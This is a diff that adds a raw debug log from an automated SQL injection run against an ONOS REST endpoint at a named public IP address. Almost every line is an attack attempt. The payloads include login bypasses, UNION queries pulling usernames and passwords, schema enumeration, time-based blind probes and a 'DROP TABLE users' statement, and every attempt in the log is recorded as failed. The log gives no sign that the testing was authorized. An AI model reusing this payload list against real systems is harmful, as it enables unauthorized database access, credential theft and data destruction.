@@ -1,0 +1,336 @@
+2024-12-18 21:16:17,560 - DEBUG - Starting new HTTP connection (1): 34.139.11.27:8181
+2024-12-18 21:16:17,906 - DEBUG - http://34.139.11.27:8181 "GET /onos/v1/docs/index.html HTTP/1.1" 401 483
+2024-12-18 21:16:17,906 - DEBUG - Falha com payload: 'onos' OR 1=1--' - Status: Sem resposta
+2024-12-18 21:16:17,907 - DEBUG - Starting new HTTP connection (1): 34.139.11.27:8181
+2024-12-18 21:16:18,254 - DEBUG - http://34.139.11.27:8181 "GET /onos/v1/docs/index.html HTTP/1.1" 401 483
+2024-12-18 21:16:18,255 - DEBUG - Falha com payload: '' OR '1'='1--' - Status: Sem resposta
+2024-12-18 21:16:18,256 - DEBUG - Starting new HTTP connection (1): 34.139.11.27:8181
+2024-12-18 21:16:18,607 - DEBUG - http://34.139.11.27:8181 "GET /onos/v1/docs/index.html HTTP/1.1" 401 483
+2024-12-18 21:16:18,607 - DEBUG - Falha com payload: '' OR 1=1#' - Status: Sem resposta
+2024-12-18 21:16:18,609 - DEBUG - Starting new HTTP connection (1): 34.139.11.27:8181
+2024-12-18 21:16:18,959 - DEBUG - http://34.139.11.27:8181 "GET /onos/v1/docs/index.html HTTP/1.1" 401 483
+2024-12-18 21:16:18,972 - DEBUG - Falha com payload: '' OR '1'='1'/*' - Status: Sem resposta
+2024-12-18 21:16:18,974 - DEBUG - Starting new HTTP connection (1): 34.139.11.27:8181
+2024-12-18 21:16:19,329 - DEBUG - http://34.139.11.27:8181 "GET /onos/v1/docs/index.html HTTP/1.1" 401 483
+2024-12-18 21:16:19,333 - DEBUG - Falha com payload: 'onos'--' - Status: Sem resposta
+2024-12-18 21:16:19,335 - DEBUG - Starting new HTTP connection (1): 34.139.11.27:8181
+2024-12-18 21:16:19,694 - DEBUG - http://34.139.11.27:8181 "GET /onos/v1/docs/index.html HTTP/1.1" 401 483
+2024-12-18 21:16:19,702 - DEBUG - Falha com payload: '' OR TRUE--' - Status: Sem resposta
+2024-12-18 21:16:19,703 - DEBUG - Starting new HTTP connection (1): 34.139.11.27:8181
+2024-12-18 21:16:20,074 - DEBUG - http://34.139.11.27:8181 "GET /onos/v1/docs/index.html HTTP/1.1" 401 483
+2024-12-18 21:16:20,075 - DEBUG - Falha com payload: '' OR 'x'='x--' - Status: Sem resposta
+2024-12-18 21:16:20,075 - DEBUG - Starting new HTTP connection (1): 34.139.11.27:8181
+2024-12-18 21:16:20,462 - DEBUG - http://34.139.11.27:8181 "GET /onos/v1/docs/index.html HTTP/1.1" 401 483
+2024-12-18 21:16:20,462 - DEBUG - Falha com payload: '' OR ''=''--' - Status: Sem resposta
+2024-12-18 21:16:20,463 - DEBUG - Starting new HTTP connection (1): 34.139.11.27:8181
+2024-12-18 21:16:20,813 - DEBUG - http://34.139.11.27:8181 "GET /onos/v1/docs/index.html HTTP/1.1" 401 483
+2024-12-18 21:16:20,815 - DEBUG - Falha com payload: 'onos' UNION SELECT null, null--' - Status: Sem resposta
+2024-12-18 21:16:20,816 - DEBUG - Starting new HTTP connection (1): 34.139.11.27:8181
+2024-12-18 21:16:21,170 - DEBUG - http://34.139.11.27:8181 "GET /onos/v1/docs/index.html HTTP/1.1" 401 483
+2024-12-18 21:16:21,171 - DEBUG - Falha com payload: 'onos' UNION SELECT 1, 'test'--' - Status: Sem resposta
+2024-12-18 21:16:21,172 - DEBUG - Starting new HTTP connection (1): 34.139.11.27:8181
+2024-12-18 21:16:21,520 - DEBUG - http://34.139.11.27:8181 "GET /onos/v1/docs/index.html HTTP/1.1" 401 483
+2024-12-18 21:16:21,521 - DEBUG - Falha com payload: 'onos' UNION SELECT null, table_name FROM information_schema.tables--' - Status: Sem resposta
+2024-12-18 21:16:21,522 - DEBUG - Starting new HTTP connection (1): 34.139.11.27:8181
+2024-12-18 21:16:21,876 - DEBUG - http://34.139.11.27:8181 "GET /onos/v1/docs/index.html HTTP/1.1" 401 483
+2024-12-18 21:16:21,877 - DEBUG - Falha com payload: 'onos' UNION SELECT null, column_name FROM information_schema.columns WHERE table_name='users'--' - Status: Sem resposta
+2024-12-18 21:16:21,878 - DEBUG - Starting new HTTP connection (1): 34.139.11.27:8181
+2024-12-18 21:16:22,231 - DEBUG - http://34.139.11.27:8181 "GET /onos/v1/docs/index.html HTTP/1.1" 401 483
+2024-12-18 21:16:22,232 - DEBUG - Falha com payload: 'onos' UNION SELECT username, password FROM users--' - Status: Sem resposta
+2024-12-18 21:16:22,233 - DEBUG - Starting new HTTP connection (1): 34.139.11.27:8181
+2024-12-18 21:16:22,578 - DEBUG - http://34.139.11.27:8181 "GET /onos/v1/docs/index.html HTTP/1.1" 401 483
+2024-12-18 21:16:22,579 - DEBUG - Falha com payload: 'onos' UNION SELECT database(), version()--' - Status: Sem resposta
+2024-12-18 21:16:22,581 - DEBUG - Starting new HTTP connection (1): 34.139.11.27:8181
+2024-12-18 21:16:22,938 - DEBUG - http://34.139.11.27:8181 "GET /onos/v1/docs/index.html HTTP/1.1" 401 483
+2024-12-18 21:16:22,939 - DEBUG - Falha com payload: 'onos' AND 1=1--' - Status: Sem resposta
+2024-12-18 21:16:22,940 - DEBUG - Starting new HTTP connection (1): 34.139.11.27:8181
+2024-12-18 21:16:23,290 - DEBUG - http://34.139.11.27:8181 "GET /onos/v1/docs/index.html HTTP/1.1" 401 483
+2024-12-18 21:16:23,292 - DEBUG - Falha com payload: 'onos' AND 1=2--' - Status: Sem resposta
+2024-12-18 21:16:23,293 - DEBUG - Starting new HTTP connection (1): 34.139.11.27:8181
+2024-12-18 21:16:23,639 - DEBUG - http://34.139.11.27:8181 "GET /onos/v1/docs/index.html HTTP/1.1" 401 483
+2024-12-18 21:16:23,640 - DEBUG - Falha com payload: 'onos' OR EXISTS(SELECT 1)--' - Status: Sem resposta
+2024-12-18 21:16:23,641 - DEBUG - Starting new HTTP connection (1): 34.139.11.27:8181
+2024-12-18 21:16:23,986 - DEBUG - http://34.139.11.27:8181 "GET /onos/v1/docs/index.html HTTP/1.1" 401 483
+2024-12-18 21:16:23,987 - DEBUG - Falha com payload: 'onos' OR NOT EXISTS(SELECT null)--' - Status: Sem resposta
+2024-12-18 21:16:23,988 - DEBUG - Starting new HTTP connection (1): 34.139.11.27:8181
+2024-12-18 21:16:24,340 - DEBUG - http://34.139.11.27:8181 "GET /onos/v1/docs/index.html HTTP/1.1" 401 483
+2024-12-18 21:16:24,341 - DEBUG - Falha com payload: 'onos' OR LENGTH(database())>5--' - Status: Sem resposta
+2024-12-18 21:16:24,344 - DEBUG - Starting new HTTP connection (1): 34.139.11.27:8181
+2024-12-18 21:16:24,700 - DEBUG - http://34.139.11.27:8181 "GET /onos/v1/docs/index.html HTTP/1.1" 401 483
+2024-12-18 21:16:24,700 - DEBUG - Falha com payload: 'onos' AND SUBSTRING((SELECT @@version), 1, 1)='5'--' - Status: Sem resposta
+2024-12-18 21:16:24,702 - DEBUG - Starting new HTTP connection (1): 34.139.11.27:8181
+2024-12-18 21:16:25,046 - DEBUG - http://34.139.11.27:8181 "GET /onos/v1/docs/index.html HTTP/1.1" 401 483
+2024-12-18 21:16:25,047 - DEBUG - Falha com payload: 'onos' AND (SELECT COUNT(*) FROM users)>0--' - Status: Sem resposta
+2024-12-18 21:16:25,048 - DEBUG - Starting new HTTP connection (1): 34.139.11.27:8181
+2024-12-18 21:16:25,395 - DEBUG - http://34.139.11.27:8181 "GET /onos/v1/docs/index.html HTTP/1.1" 401 483
+2024-12-18 21:16:25,396 - DEBUG - Falha com payload: 'onos' AND 1=CAST((SELECT COUNT(*) FROM users) AS SIGNED)--' - Status: Sem resposta
+2024-12-18 21:16:25,397 - DEBUG - Starting new HTTP connection (1): 34.139.11.27:8181
+2024-12-18 21:16:25,744 - DEBUG - http://34.139.11.27:8181 "GET /onos/v1/docs/index.html HTTP/1.1" 401 483
+2024-12-18 21:16:25,745 - DEBUG - Falha com payload: 'onos' OR (SELECT CASE WHEN (1=1) THEN 1 ELSE 0 END)=1--' - Status: Sem resposta
+2024-12-18 21:16:25,746 - DEBUG - Starting new HTTP connection (1): 34.139.11.27:8181
+2024-12-18 21:16:26,091 - DEBUG - http://34.139.11.27:8181 "GET /onos/v1/docs/index.html HTTP/1.1" 401 483
+2024-12-18 21:16:26,092 - DEBUG - Falha com payload: 'onos' OR CAST('test' AS SIGNED INTEGER)=0--' - Status: Sem resposta
+2024-12-18 21:16:26,093 - DEBUG - Starting new HTTP connection (1): 34.139.11.27:8181
+2024-12-18 21:16:26,438 - DEBUG - http://34.139.11.27:8181 "GET /onos/v1/docs/index.html HTTP/1.1" 401 483
+2024-12-18 21:16:26,438 - DEBUG - Falha com payload: 'onos' OR 1=CONVERT('1', DECIMAL)--' - Status: Sem resposta
+2024-12-18 21:16:26,439 - DEBUG - Starting new HTTP connection (1): 34.139.11.27:8181
+2024-12-18 21:16:26,795 - DEBUG - http://34.139.11.27:8181 "GET /onos/v1/docs/index.html HTTP/1.1" 401 483
+2024-12-18 21:16:26,795 - DEBUG - Falha com payload: 'onos' UNION SELECT NULL, CONCAT(username, ':', password) FROM users--' - Status: Sem resposta
+2024-12-18 21:16:26,796 - DEBUG - Starting new HTTP connection (1): 34.139.11.27:8181
+2024-12-18 21:16:27,140 - DEBUG - http://34.139.11.27:8181 "GET /onos/v1/docs/index.html HTTP/1.1" 401 483
+2024-12-18 21:16:27,142 - DEBUG - Falha com payload: 'onos' UNION SELECT NULL, CONCAT_WS(':', table_schema, table_name) FROM information_schema.tables--' - Status: Sem resposta
+2024-12-18 21:16:27,142 - DEBUG - Starting new HTTP connection (1): 34.139.11.27:8181
+2024-12-18 21:16:27,491 - DEBUG - http://34.139.11.27:8181 "GET /onos/v1/docs/index.html HTTP/1.1" 401 483
+2024-12-18 21:16:27,492 - DEBUG - Falha com payload: 'onos' OR SLEEP(5)--' - Status: Sem resposta
+2024-12-18 21:16:27,493 - DEBUG - Starting new HTTP connection (1): 34.139.11.27:8181
+2024-12-18 21:16:27,853 - DEBUG - http://34.139.11.27:8181 "GET /onos/v1/docs/index.html HTTP/1.1" 401 483
+2024-12-18 21:16:27,854 - DEBUG - Falha com payload: 'onos' AND IF(1=1, SLEEP(5), 0)--' - Status: Sem resposta
+2024-12-18 21:16:27,855 - DEBUG - Starting new HTTP connection (1): 34.139.11.27:8181
+2024-12-18 21:16:28,201 - DEBUG - http://34.139.11.27:8181 "GET /onos/v1/docs/index.html HTTP/1.1" 401 483
+2024-12-18 21:16:28,201 - DEBUG - Falha com payload: 'onos' AND BENCHMARK(1000000, MD5(1))--' - Status: Sem resposta
+2024-12-18 21:16:28,203 - DEBUG - Starting new HTTP connection (1): 34.139.11.27:8181
+2024-12-18 21:16:28,564 - DEBUG - http://34.139.11.27:8181 "GET /onos/v1/docs/index.html HTTP/1.1" 401 483
+2024-12-18 21:16:28,565 - DEBUG - Falha com payload: 'onos' OR (SELECT IF(LENGTH(database())>5, SLEEP(5), 0))--' - Status: Sem resposta
+2024-12-18 21:16:28,566 - DEBUG - Starting new HTTP connection (1): 34.139.11.27:8181
+2024-12-18 21:16:28,918 - DEBUG - http://34.139.11.27:8181 "GET /onos/v1/docs/index.html HTTP/1.1" 401 483
+2024-12-18 21:16:28,923 - DEBUG - Falha com payload: 'onos' AND IF(EXISTS(SELECT 1 FROM users WHERE username='admin'), SLEEP(5), 0)--' - Status: Sem resposta
+2024-12-18 21:16:28,925 - DEBUG - Starting new HTTP connection (1): 34.139.11.27:8181
+2024-12-18 21:16:29,273 - DEBUG - http://34.139.11.27:8181 "GET /onos/v1/docs/index.html HTTP/1.1" 401 483
+2024-12-18 21:16:29,274 - DEBUG - Falha com payload: 'onos' UNION SELECT schema_name, null FROM information_schema.schemata--' - Status: Sem resposta
+2024-12-18 21:16:29,276 - DEBUG - Starting new HTTP connection (1): 34.139.11.27:8181
+2024-12-18 21:16:29,623 - DEBUG - http://34.139.11.27:8181 "GET /onos/v1/docs/index.html HTTP/1.1" 401 483
+2024-12-18 21:16:29,630 - DEBUG - Falha com payload: 'onos' UNION SELECT table_name, null FROM information_schema.tables WHERE table_schema='database_name'--' - Status: Sem resposta
+2024-12-18 21:16:29,634 - DEBUG - Starting new HTTP connection (1): 34.139.11.27:8181
+2024-12-18 21:16:29,996 - DEBUG - http://34.139.11.27:8181 "GET /onos/v1/docs/index.html HTTP/1.1" 401 483
+2024-12-18 21:16:29,997 - DEBUG - Falha com payload: 'onos' UNION SELECT column_name, null FROM information_schema.columns WHERE table_name='users'--' - Status: Sem resposta
+2024-12-18 21:16:29,998 - DEBUG - Starting new HTTP connection (1): 34.139.11.27:8181
+2024-12-18 21:16:30,345 - DEBUG - http://34.139.11.27:8181 "GET /onos/v1/docs/index.html HTTP/1.1" 401 483
+2024-12-18 21:16:30,346 - DEBUG - Falha com payload: 'onos' UNION SELECT table_schema, table_name FROM information_schema.tables--' - Status: Sem resposta
+2024-12-18 21:16:30,350 - DEBUG - Starting new HTTP connection (1): 34.139.11.27:8181
+2024-12-18 21:16:30,697 - DEBUG - http://34.139.11.27:8181 "GET /onos/v1/docs/index.html HTTP/1.1" 401 483
+2024-12-18 21:16:30,698 - DEBUG - Falha com payload: 'onos' AND (SELECT COUNT(*) FROM information_schema.tables)>10--' - Status: Sem resposta
+2024-12-18 21:16:30,699 - DEBUG - Starting new HTTP connection (1): 34.139.11.27:8181
+2024-12-18 21:16:31,042 - DEBUG - http://34.139.11.27:8181 "GET /onos/v1/docs/index.html HTTP/1.1" 401 483
+2024-12-18 21:16:31,044 - DEBUG - Falha com payload: 'onos' UNION SELECT 1, table_name FROM information_schema.tables WHERE table_name LIKE '%user%'--' - Status: Sem resposta
+2024-12-18 21:16:31,044 - DEBUG - Starting new HTTP connection (1): 34.139.11.27:8181
+2024-12-18 21:16:31,405 - DEBUG - http://34.139.11.27:8181 "GET /onos/v1/docs/index.html HTTP/1.1" 401 483
+2024-12-18 21:16:31,406 - DEBUG - Falha com payload: 'onos' UNION SELECT 1, column_name FROM information_schema.columns WHERE column_name LIKE '%pass%'--' - Status: Sem resposta
+2024-12-18 21:16:31,407 - DEBUG - Starting new HTTP connection (1): 34.139.11.27:8181
+2024-12-18 21:16:31,757 - DEBUG - http://34.139.11.27:8181 "GET /onos/v1/docs/index.html HTTP/1.1" 401 483
+2024-12-18 21:16:31,758 - DEBUG - Falha com payload: 'onos' UNION SELECT column_name, data_type FROM information_schema.columns WHERE table_name='users'--' - Status: Sem resposta
+2024-12-18 21:16:31,759 - DEBUG - Starting new HTTP connection (1): 34.139.11.27:8181
+2024-12-18 21:16:32,104 - DEBUG - http://34.139.11.27:8181 "GET /onos/v1/docs/index.html HTTP/1.1" 401 483
+2024-12-18 21:16:32,105 - DEBUG - Falha com payload: 'onos' UNION SELECT COUNT(*), null FROM information_schema.columns WHERE table_schema='database_name'--' - Status: Sem resposta
+2024-12-18 21:16:32,106 - DEBUG - Starting new HTTP connection (1): 34.139.11.27:8181
+2024-12-18 21:16:32,457 - DEBUG - http://34.139.11.27:8181 "GET /onos/v1/docs/index.html HTTP/1.1" 401 483
+2024-12-18 21:16:32,458 - DEBUG - Falha com payload: 'onos' OR 1=(SELECT COUNT(*) FROM users)--' - Status: Sem resposta
+2024-12-18 21:16:32,459 - DEBUG - Starting new HTTP connection (1): 34.139.11.27:8181
+2024-12-18 21:16:32,812 - DEBUG - http://34.139.11.27:8181 "GET /onos/v1/docs/index.html HTTP/1.1" 401 483
+2024-12-18 21:16:32,813 - DEBUG - Falha com payload: 'onos' AND (SELECT COUNT(*) FROM users WHERE username='admin')>0--' - Status: Sem resposta
+2024-12-18 21:16:32,815 - DEBUG - Starting new HTTP connection (1): 34.139.11.27:8181
+2024-12-18 21:16:33,170 - DEBUG - http://34.139.11.27:8181 "GET /onos/v1/docs/index.html HTTP/1.1" 401 483
+2024-12-18 21:16:33,170 - DEBUG - Falha com payload: 'onos' OR (SELECT MAX(LENGTH(password)) FROM users)>10--' - Status: Sem resposta
+2024-12-18 21:16:33,171 - DEBUG - Starting new HTTP connection (1): 34.139.11.27:8181
+2024-12-18 21:16:33,519 - DEBUG - http://34.139.11.27:8181 "GET /onos/v1/docs/index.html HTTP/1.1" 401 483
+2024-12-18 21:16:33,520 - DEBUG - Falha com payload: 'onos' AND (SELECT SUM(LENGTH(password)) FROM users)=100--' - Status: Sem resposta
+2024-12-18 21:16:33,521 - DEBUG - Starting new HTTP connection (1): 34.139.11.27:8181
+2024-12-18 21:16:33,868 - DEBUG - http://34.139.11.27:8181 "GET /onos/v1/docs/index.html HTTP/1.1" 401 483
+2024-12-18 21:16:33,868 - DEBUG - Falha com payload: 'onos" OR "1"="1--' - Status: Sem resposta
+2024-12-18 21:16:33,870 - DEBUG - Starting new HTTP connection (1): 34.139.11.27:8181
+2024-12-18 21:16:34,221 - DEBUG - http://34.139.11.27:8181 "GET /onos/v1/docs/index.html HTTP/1.1" 401 483
+2024-12-18 21:16:34,228 - DEBUG - Falha com payload: 'onos' OR '1'='1'--' - Status: Sem resposta
+2024-12-18 21:16:34,229 - DEBUG - Starting new HTTP connection (1): 34.139.11.27:8181
+2024-12-18 21:16:34,580 - DEBUG - http://34.139.11.27:8181 "GET /onos/v1/docs/index.html HTTP/1.1" 401 483
+2024-12-18 21:16:34,581 - DEBUG - Falha com payload: 'onos'/**/OR/**/1=1--' - Status: Sem resposta
+2024-12-18 21:16:34,583 - DEBUG - Starting new HTTP connection (1): 34.139.11.27:8181
+2024-12-18 21:16:34,943 - DEBUG - http://34.139.11.27:8181 "GET /onos/v1/docs/index.html HTTP/1.1" 401 483
+2024-12-18 21:16:34,944 - DEBUG - Falha com payload: 'onos'||'1'||'='||'1--' - Status: Sem resposta
+2024-12-18 21:16:34,946 - DEBUG - Starting new HTTP connection (1): 34.139.11.27:8181
+2024-12-18 21:16:35,306 - DEBUG - http://34.139.11.27:8181 "GET /onos/v1/docs/index.html HTTP/1.1" 401 483
+2024-12-18 21:16:35,307 - DEBUG - Falha com payload: 'onos' OR CHAR(49)=CHAR(49)--' - Status: Sem resposta
+2024-12-18 21:16:35,315 - DEBUG - Starting new HTTP connection (1): 34.139.11.27:8181
+2024-12-18 21:16:35,670 - DEBUG - http://34.139.11.27:8181 "GET /onos/v1/docs/index.html HTTP/1.1" 401 483
+2024-12-18 21:16:35,670 - DEBUG - Falha com payload: 'onos' OR 'x'||'y'||'z'='xyz'--' - Status: Sem resposta
+2024-12-18 21:16:35,671 - DEBUG - Starting new HTTP connection (1): 34.139.11.27:8181
+2024-12-18 21:16:36,024 - DEBUG - http://34.139.11.27:8181 "GET /onos/v1/docs/index.html HTTP/1.1" 401 483
+2024-12-18 21:16:36,025 - DEBUG - Falha com payload: 'onos'--' - Status: Sem resposta
+2024-12-18 21:16:36,025 - DEBUG - Starting new HTTP connection (1): 34.139.11.27:8181
+2024-12-18 21:16:36,394 - DEBUG - http://34.139.11.27:8181 "GET /onos/v1/docs/index.html HTTP/1.1" 401 483
+2024-12-18 21:16:36,395 - DEBUG - Falha com payload: 'onos'/*' - Status: Sem resposta
+2024-12-18 21:16:36,396 - DEBUG - Starting new HTTP connection (1): 34.139.11.27:8181
+2024-12-18 21:16:36,743 - DEBUG - http://34.139.11.27:8181 "GET /onos/v1/docs/index.html HTTP/1.1" 401 483
+2024-12-18 21:16:36,743 - DEBUG - Falha com payload: 'onos';--' - Status: Sem resposta
+2024-12-18 21:16:36,746 - DEBUG - Starting new HTTP connection (1): 34.139.11.27:8181
+2024-12-18 21:16:37,109 - DEBUG - http://34.139.11.27:8181 "GET /onos/v1/docs/index.html HTTP/1.1" 401 483
+2024-12-18 21:16:37,111 - DEBUG - Falha com payload: 'onos'; DROP TABLE users;--' - Status: Sem resposta
+2024-12-18 21:16:37,112 - DEBUG - Starting new HTTP connection (1): 34.139.11.27:8181
+2024-12-18 21:16:37,457 - DEBUG - http://34.139.11.27:8181 "GET /onos/v1/docs/index.html HTTP/1.1" 401 483
+2024-12-18 21:16:37,458 - DEBUG - Falha com payload: 'onos' OR 1=1;--' - Status: Sem resposta
+2024-12-18 21:24:11,870 - DEBUG - Starting new HTTP connection (1): 34.139.11.27:8181
+2024-12-18 21:24:12,233 - DEBUG - http://34.139.11.27:8181 "GET /onos/v1/docs/index.html HTTP/1.1" 401 483
+2024-12-18 21:24:12,234 - DEBUG - Falha com payload: 'onos' OR 1=1--' - Status: Sem resposta
+2024-12-18 21:24:12,235 - DEBUG - Starting new HTTP connection (1): 34.139.11.27:8181
+2024-12-18 21:24:12,583 - DEBUG - http://34.139.11.27:8181 "GET /onos/v1/docs/index.html HTTP/1.1" 401 483
+2024-12-18 21:24:12,583 - DEBUG - Falha com payload: '' OR '1'='1--' - Status: Sem resposta
+2024-12-18 21:24:12,585 - DEBUG - Starting new HTTP connection (1): 34.139.11.27:8181
+2024-12-18 21:24:12,935 - DEBUG - http://34.139.11.27:8181 "GET /onos/v1/docs/index.html HTTP/1.1" 401 483
+2024-12-18 21:24:12,936 - DEBUG - Falha com payload: '' OR 1=1#' - Status: Sem resposta
+2024-12-18 21:24:12,937 - DEBUG - Starting new HTTP connection (1): 34.139.11.27:8181
+2024-12-18 21:24:13,281 - DEBUG - http://34.139.11.27:8181 "GET /onos/v1/docs/index.html HTTP/1.1" 401 483
+2024-12-18 21:24:13,281 - DEBUG - Falha com payload: '' OR '1'='1'/*' - Status: Sem resposta
+2024-12-18 21:24:13,282 - DEBUG - Starting new HTTP connection (1): 34.139.11.27:8181
+2024-12-18 21:24:13,631 - DEBUG - http://34.139.11.27:8181 "GET /onos/v1/docs/index.html HTTP/1.1" 401 483
+2024-12-18 21:24:13,633 - DEBUG - Falha com payload: 'onos'--' - Status: Sem resposta
+2024-12-18 21:24:13,635 - DEBUG - Starting new HTTP connection (1): 34.139.11.27:8181
+2024-12-18 21:24:13,982 - DEBUG - http://34.139.11.27:8181 "GET /onos/v1/docs/index.html HTTP/1.1" 401 483
+2024-12-18 21:24:13,983 - DEBUG - Falha com payload: '' OR TRUE--' - Status: Sem resposta
+2024-12-18 21:24:13,984 - DEBUG - Starting new HTTP connection (1): 34.139.11.27:8181
+2024-12-18 21:24:14,331 - DEBUG - http://34.139.11.27:8181 "GET /onos/v1/docs/index.html HTTP/1.1" 401 483
+2024-12-18 21:24:14,332 - DEBUG - Falha com payload: '' OR 'x'='x--' - Status: Sem resposta
+2024-12-18 21:24:14,333 - DEBUG - Starting new HTTP connection (1): 34.139.11.27:8181
+2024-12-18 21:24:14,693 - DEBUG - http://34.139.11.27:8181 "GET /onos/v1/docs/index.html HTTP/1.1" 401 483
+2024-12-18 21:24:14,694 - DEBUG - Falha com payload: '' OR ''=''--' - Status: Sem resposta
+2024-12-18 21:24:14,697 - DEBUG - Starting new HTTP connection (1): 34.139.11.27:8181
+2024-12-18 21:24:15,050 - DEBUG - http://34.139.11.27:8181 "GET /onos/v1/docs/index.html HTTP/1.1" 401 483
+2024-12-18 21:24:15,051 - DEBUG - Falha com payload: 'onos' UNION SELECT null, null--' - Status: Sem resposta
+2024-12-18 21:24:15,054 - DEBUG - Starting new HTTP connection (1): 34.139.11.27:8181
+2024-12-18 21:24:15,411 - DEBUG - http://34.139.11.27:8181 "GET /onos/v1/docs/index.html HTTP/1.1" 401 483
+2024-12-18 21:24:15,412 - DEBUG - Falha com payload: 'onos' UNION SELECT 1, 'test'--' - Status: Sem resposta
+2024-12-18 21:24:15,414 - DEBUG - Starting new HTTP connection (1): 34.139.11.27:8181
+2024-12-18 21:24:15,760 - DEBUG - http://34.139.11.27:8181 "GET /onos/v1/docs/index.html HTTP/1.1" 401 483
+2024-12-18 21:24:15,761 - DEBUG - Falha com payload: 'onos' UNION SELECT null, table_name FROM information_schema.tables--' - Status: Sem resposta
+2024-12-18 21:24:15,766 - DEBUG - Starting new HTTP connection (1): 34.139.11.27:8181
+2024-12-18 21:24:16,131 - DEBUG - http://34.139.11.27:8181 "GET /onos/v1/docs/index.html HTTP/1.1" 401 483
+2024-12-18 21:24:16,132 - DEBUG - Falha com payload: 'onos' UNION SELECT null, column_name FROM information_schema.columns WHERE table_name='users'--' - Status: Sem resposta
+2024-12-18 21:24:16,137 - DEBUG - Starting new HTTP connection (1): 34.139.11.27:8181
+2024-12-18 21:24:16,503 - DEBUG - http://34.139.11.27:8181 "GET /onos/v1/docs/index.html HTTP/1.1" 401 483
+2024-12-18 21:24:16,507 - DEBUG - Falha com payload: 'onos' UNION SELECT username, password FROM users--' - Status: Sem resposta
+2024-12-18 21:24:16,509 - DEBUG - Starting new HTTP connection (1): 34.139.11.27:8181
+2024-12-18 21:24:16,853 - DEBUG - http://34.139.11.27:8181 "GET /onos/v1/docs/index.html HTTP/1.1" 401 483
+2024-12-18 21:24:16,853 - DEBUG - Falha com payload: 'onos' UNION SELECT database(), version()--' - Status: Sem resposta
+2024-12-18 21:24:16,855 - DEBUG - Starting new HTTP connection (1): 34.139.11.27:8181
+2024-12-18 21:24:17,202 - DEBUG - http://34.139.11.27:8181 "GET /onos/v1/docs/index.html HTTP/1.1" 401 483
+2024-12-18 21:24:17,202 - DEBUG - Falha com payload: 'onos' AND 1=1--' - Status: Sem resposta
+2024-12-18 21:24:17,203 - DEBUG - Starting new HTTP connection (1): 34.139.11.27:8181
+2024-12-18 21:24:17,552 - DEBUG - http://34.139.11.27:8181 "GET /onos/v1/docs/index.html HTTP/1.1" 401 483
+2024-12-18 21:24:17,553 - DEBUG - Falha com payload: 'onos' AND 1=2--' - Status: Sem resposta
+2024-12-18 21:24:17,554 - DEBUG - Starting new HTTP connection (1): 34.139.11.27:8181
+2024-12-18 21:24:17,907 - DEBUG - http://34.139.11.27:8181 "GET /onos/v1/docs/index.html HTTP/1.1" 401 483
+2024-12-18 21:24:17,909 - DEBUG - Falha com payload: 'onos' OR EXISTS(SELECT 1)--' - Status: Sem resposta
+2024-12-18 21:24:17,910 - DEBUG - Starting new HTTP connection (1): 34.139.11.27:8181
+2024-12-18 21:24:18,267 - DEBUG - http://34.139.11.27:8181 "GET /onos/v1/docs/index.html HTTP/1.1" 401 483
+2024-12-18 21:24:18,269 - DEBUG - Falha com payload: 'onos' OR NOT EXISTS(SELECT null)--' - Status: Sem resposta
+2024-12-18 21:24:18,273 - DEBUG - Starting new HTTP connection (1): 34.139.11.27:8181
+2024-12-18 21:24:18,638 - DEBUG - http://34.139.11.27:8181 "GET /onos/v1/docs/index.html HTTP/1.1" 401 483
+2024-12-18 21:24:18,646 - DEBUG - Falha com payload: 'onos' OR LENGTH(database())>5--' - Status: Sem resposta
+2024-12-18 21:24:18,650 - DEBUG - Starting new HTTP connection (1): 34.139.11.27:8181
+2024-12-18 21:24:19,012 - DEBUG - http://34.139.11.27:8181 "GET /onos/v1/docs/index.html HTTP/1.1" 401 483
+2024-12-18 21:24:19,014 - DEBUG - Falha com payload: 'onos' AND SUBSTRING((SELECT @@version), 1, 1)='5'--' - Status: Sem resposta
+2024-12-18 21:24:19,017 - DEBUG - Starting new HTTP connection (1): 34.139.11.27:8181
+2024-12-18 21:24:19,365 - DEBUG - http://34.139.11.27:8181 "GET /onos/v1/docs/index.html HTTP/1.1" 401 483
+2024-12-18 21:24:19,367 - DEBUG - Falha com payload: 'onos' AND (SELECT COUNT(*) FROM users)>0--' - Status: Sem resposta
+2024-12-18 21:24:19,373 - DEBUG - Starting new HTTP connection (1): 34.139.11.27:8181
+2024-12-18 21:24:19,721 - DEBUG - http://34.139.11.27:8181 "GET /onos/v1/docs/index.html HTTP/1.1" 401 483
+2024-12-18 21:24:19,722 - DEBUG - Falha com payload: 'onos' AND 1=CAST((SELECT COUNT(*) FROM users) AS SIGNED)--' - Status: Sem resposta
+2024-12-18 21:24:19,723 - DEBUG - Starting new HTTP connection (1): 34.139.11.27:8181
+2024-12-18 21:24:20,066 - DEBUG - http://34.139.11.27:8181 "GET /onos/v1/docs/index.html HTTP/1.1" 401 483
+2024-12-18 21:24:20,067 - DEBUG - Falha com payload: 'onos' OR (SELECT CASE WHEN (1=1) THEN 1 ELSE 0 END)=1--' - Status: Sem resposta
+2024-12-18 21:24:20,068 - DEBUG - Starting new HTTP connection (1): 34.139.11.27:8181
+2024-12-18 21:24:20,414 - DEBUG - http://34.139.11.27:8181 "GET /onos/v1/docs/index.html HTTP/1.1" 401 483
+2024-12-18 21:24:20,415 - DEBUG - Falha com payload: 'onos' OR CAST('test' AS SIGNED INTEGER)=0--' - Status: Sem resposta
+2024-12-18 21:24:20,416 - DEBUG - Starting new HTTP connection (1): 34.139.11.27:8181
+2024-12-18 21:24:20,765 - DEBUG - http://34.139.11.27:8181 "GET /onos/v1/docs/index.html HTTP/1.1" 401 483
+2024-12-18 21:24:20,765 - DEBUG - Falha com payload: 'onos' OR 1=CONVERT('1', DECIMAL)--' - Status: Sem resposta
+2024-12-18 21:24:20,766 - DEBUG - Starting new HTTP connection (1): 34.139.11.27:8181
+2024-12-18 21:24:21,116 - DEBUG - http://34.139.11.27:8181 "GET /onos/v1/docs/index.html HTTP/1.1" 401 483
+2024-12-18 21:24:21,116 - DEBUG - Falha com payload: 'onos' UNION SELECT NULL, CONCAT(username, ':', password) FROM users--' - Status: Sem resposta
+2024-12-18 21:24:21,117 - DEBUG - Starting new HTTP connection (1): 34.139.11.27:8181
+2024-12-18 21:24:21,459 - DEBUG - http://34.139.11.27:8181 "GET /onos/v1/docs/index.html HTTP/1.1" 401 483
+2024-12-18 21:24:21,460 - DEBUG - Falha com payload: 'onos' UNION SELECT NULL, CONCAT_WS(':', table_schema, table_name) FROM information_schema.tables--' - Status: Sem resposta
+2024-12-18 21:24:21,461 - DEBUG - Starting new HTTP connection (1): 34.139.11.27:8181
